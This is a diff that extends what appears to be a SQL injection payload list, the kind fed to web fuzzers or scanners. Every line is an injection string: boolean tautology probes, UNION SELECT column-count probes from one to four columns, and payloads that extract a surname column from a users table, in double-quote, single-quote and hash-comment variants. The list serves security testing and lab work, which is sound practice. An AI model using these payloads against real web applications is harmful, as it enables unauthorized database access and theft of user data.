@@ -4,28 +4,55 @@
 " union select 1--
 " union select 1,2--
 " union select 1,2,3--
+" union select 1,2,3,4--
+" or "1"="2"--"
+" union select 1--"
+" union select 1,2--"
+" union select 1,2,3--"
+" union select 1,2,3,4--"
 ' and '1'='1
 ' and '1'='2
 ' or '1'='2'--
  ' union select 1--
  ' union select 1,2--
  ' union select 1,2,3--
+ ' union select 1,2,3,4--
+ ' or '1'='2'--'
+ ' union select 1--'
+ ' union select 1,2--'
+ ' union select 1,2,3--'
+ ' union select 1,2,3,4--'
  and 1=1#
  and 1=2#
  or 1=2#
  union select 1#
  union select 1,2#
  union select 1,2,3#
+ union select 1,2,3,4#
  " or "1"="1"--
  " union select surname FROM users--
  " union select surname,surname FROM users--
 
  " union select surname,surname,surname FROM users--
+ " union select surname,surname,surname,surname FROM users--
  ' or '1'='1'--
  ' union select surname FROM users--
  ' union select surname,surname FROM users--
  ' union select surname,surname,surname FROM users--
+ ' union select surname,surname,surname,surname FROM users--
+ " or "1"="1"--'
+ " union select surname FROM users--'
+ " union select surname,surname FROM users--'
+
+ " union select surname,surname,surname FROM users--'
+ " union select surname,surname,surname,surname FROM users--'
+ ' or '1'='1'--'
+ ' union select surname FROM users--'
+ ' union select surname,surname FROM users--'
+ ' union select surname,surname,surname FROM users--'
+ ' union select surname,surname,surname,surname FROM users--'
  or 1=1#
  union select surname FROM users#
  union select surname,surname FROM users#
  union select surname,surname,surname FROM users#
+ union select surname,surname,surname,surname FROM users#
